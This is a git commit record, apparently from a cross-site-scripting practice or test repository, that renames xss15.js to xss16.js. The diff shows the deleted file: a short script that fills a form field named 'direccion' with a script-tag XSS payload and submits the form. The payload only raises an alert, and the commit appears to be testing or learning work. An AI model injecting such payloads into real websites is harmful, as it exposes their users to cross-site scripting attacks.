f46c56bfd4e43e10dfc7991666f7bbce0fb98f5a
Rodrigo Florian <125144252+RODRIGOF-FG@users.noreply.github.com>
2026-06-19 17:09:30 -0500

    Update and rename xss15.js to xss16.js

--- xss15.js
+++
@@ -1,7 +0,0 @@
-(function(){
-  var payload=document.querySelector('[name="direccion"]');
-  if(payload){
-    payload.value='"><script>alert("XSS desde DOM")</script>';
-    payload.form.submit();
-  }
-})();
